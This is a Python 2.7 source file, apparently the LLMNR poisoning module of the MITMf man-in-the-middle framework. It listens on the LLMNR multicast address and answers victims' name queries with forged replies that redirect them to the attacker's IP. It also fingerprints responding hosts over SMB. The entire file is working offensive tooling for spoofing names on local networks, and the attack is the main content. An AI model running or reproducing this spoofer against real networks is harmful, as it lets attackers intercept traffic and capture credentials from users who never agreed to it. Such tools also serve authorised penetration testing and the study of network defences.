#! /usr/bin/env python2.7

import socket
import threading
import struct
import logging

from SocketServer import UDPServer, ThreadingMixIn, BaseRequestHandler
from core.configwatcher import ConfigWatcher
from core.responder.fingerprinter.Fingerprint import RunSmbFinger
from core.responder.packet import Packet
from core.responder.odict import OrderedDict
from core.responder.common import *

mitmf_logger = logging.getLogger("mitmf")

class LLMNRPoisoner:

	def start(self, options, ourip):

		global args; args = options #For now a quick hack to make argparse's namespace object available to all
		global OURIP ; OURIP = ourip  #and our ip address

		try:
			mitmf_logger.debug("[LLMNRPoisoner] OURIP => {}".format(OURIP))
			server = ThreadingUDPLLMNRServer(("0.0.0.0", 5355), LLMNR)
			t = threading.Thread(name="LLMNRPoisoner", target=server.serve_forever) #LLMNR
			t.setDaemon(True)
			t.start()
		except Exception, e:
			mitmf_logger.error("[LLMNRPoisoner] Error starting on port 5355: {}:".format(e))

class ThreadingUDPLLMNRServer(ThreadingMixIn, UDPServer):

	allow_reuse_address = 1

	def server_bind(self):
		MADDR = "224.0.0.252"
		self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
		Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,socket.inet_aton(MADDR) + socket.inet_aton(OURIP))

		UDPServer.server_bind(self)

#LLMNR Answer packet.
class LLMNRAns(Packet):
	fields = OrderedDict([
		("Tid",              ""),
		("Flags",            "\x80\x00"),
		("Question",         "\x00\x01"),
		("AnswerRRS",        "\x00\x01"),
		("AuthorityRRS",     "\x00\x00"),
		("AdditionalRRS",    "\x00\x00"),
		("QuestionNameLen",  "\x09"),
		("QuestionName",     ""),
		("QuestionNameNull", "\x00"),
		("Type",             "\x00\x01"),
		("Class",            "\x00\x01"),
		("AnswerNameLen",    "\x09"),
		("AnswerName",       ""),
		("AnswerNameNull",   "\x00"),
		("Type1",            "\x00\x01"),
		("Class1",           "\x00\x01"),
		("TTL",              "\x00\x00\x00\x1e"),##Poison for 30 sec.
		("IPLen",            "\x00\x04"),
		("IP",               "\x00\x00\x00\x00"),
	])

	def calculate(self):
		self.fields["IP"] = socket.inet_aton(OURIP)
		self.fields["IPLen"] = struct.pack(">h",len(self.fields["IP"]))
		self.fields["AnswerNameLen"] = struct.pack(">h",len(self.fields["AnswerName"]))[1]
		self.fields["QuestionNameLen"] = struct.pack(">h",len(self.fields["QuestionName"]))[1]

def Parse_LLMNR_Name(data):
	NameLen = struct.unpack('>B',data[12])[0]
	Name = data[13:13+NameLen]
	return Name

# LLMNR Server class.
class LLMNR(BaseRequestHandler):

	def handle(self):

		ResponderConfig   = ConfigWatcher.getInstance().getConfig()['Responder']
		DontRespondTo     = ResponderConfig['DontRespondTo']
		DontRespondToName = ResponderConfig['DontRespondToName']
		RespondTo         = ResponderConfig['RespondTo']
		RespondToName     = ResponderConfig['RespondToName'] 

		data, soc = self.request
		try:
			if data[2:4] == "\x00\x00":
				if Parse_IPV6_Addr(data):
					Name = Parse_LLMNR_Name(data)
					if args.analyze:
						if args.finger:
							try:
								Finger = RunSmbFinger((self.client_address[0],445))
								mitmf_logger.warning("[LLMNRPoisoner] {} is looking for: {} | OS: {} | Client Version: {}".format(self.client_address[0], Name,Finger[0],Finger[1]))
							except Exception:
								mitmf_logger.warning("[LLMNRPoisoner] {} is looking for: {}".format(self.client_address[0], Name))
						else:
							mitmf_logger.warning("[LLMNRPoisoner] {} is looking for: {}".format(self.client_address[0], Name))

					if DontRespondToSpecificHost(DontRespondTo):
						if RespondToIPScope(DontRespondTo, self.client_address[0]):
							return None

					if DontRespondToSpecificName(DontRespondToName) and DontRespondToNameScope(DontRespondToName.upper(), Name.upper()):
						return None 

					if RespondToSpecificHost(RespondTo):
						if args.analyze == False:
							if RespondToIPScope(RespondTo, self.client_address[0]):
								if RespondToSpecificName(RespondToName) == False:
									buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
									buff.calculate()
									for x in range(1):
										soc.sendto(str(buff), self.client_address)
										mitmf_logger.warning("[LLMNRPoisoner] Poisoned answer sent to {} the requested name was: {}".format(self.client_address[0],Name))
										if args.finger:
											try:
												Finger = RunSmbFinger((self.client_address[0],445))
												mitmf_logger.info('[LLMNRPoisoner] OS: {} | ClientVersion: {}'.format(Finger[0], Finger[1]))
											except Exception:
												mitmf_logger.info('[LLMNRPoisoner] Fingerprint failed for host: {}'.format(self.client_address[0]))
												pass

								if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
									buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
									buff.calculate()
									for x in range(1):
										soc.sendto(str(buff), self.client_address)
										mitmf_logger.warning("[LLMNRPoisoner] Poisoned answer sent to {} the requested name was: {}".format(self.client_address[0],Name))
										if args.finger:
											try:
												Finger = RunSmbFinger((self.client_address[0],445))
												mitmf_logger.info('[LLMNRPoisoner] OS: {} | ClientVersion: {}'.format(Finger[0], Finger[1]))
											except Exception:
												mitmf_logger.info('[LLMNRPoisoner] Fingerprint failed for host: {}'.format(self.client_address[0]))
												pass

					if args.analyze == False and RespondToSpecificHost(RespondTo) == False:
						if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
							buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
							buff.calculate()
							for x in range(1):
								soc.sendto(str(buff), self.client_address)
							mitmf_logger.warning("[LLMNRPoisoner] Poisoned answer sent to {} the requested name was: {}".format(self.client_address[0], Name))
							if args.finger:
								try:
									Finger = RunSmbFinger((self.client_address[0],445))
									mitmf_logger.info('[LLMNRPoisoner] OS: {} | ClientVersion: {}'.format(Finger[0], Finger[1]))
								except Exception:
									mitmf_logger.info('[LLMNRPoisoner] Fingerprint failed for host: {}'.format(self.client_address[0]))
									pass
						if RespondToSpecificName(RespondToName) == False:
							 buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
							 buff.calculate() 
							 for x in range(1):
								 soc.sendto(str(buff), self.client_address)
							 mitmf_logger.warning("[LLMNRPoisoner] Poisoned answer sent to {} the requested name was: {}".format(self.client_address[0], Name))
							 if args.finger:
								 try:
									 Finger = RunSmbFinger((self.client_address[0],445))
									 mitmf_logger.info('[LLMNRPoisoner] OS: {} | ClientVersion: {}'.format(Finger[0], Finger[1]))
								 except Exception:
									 mitmf_logger.info('[LLMNRPoisoner] Fingerprint failed for host: {}'.format(self.client_address[0]))
									 pass
						else:
							pass
			else:
				pass
		except:
			raise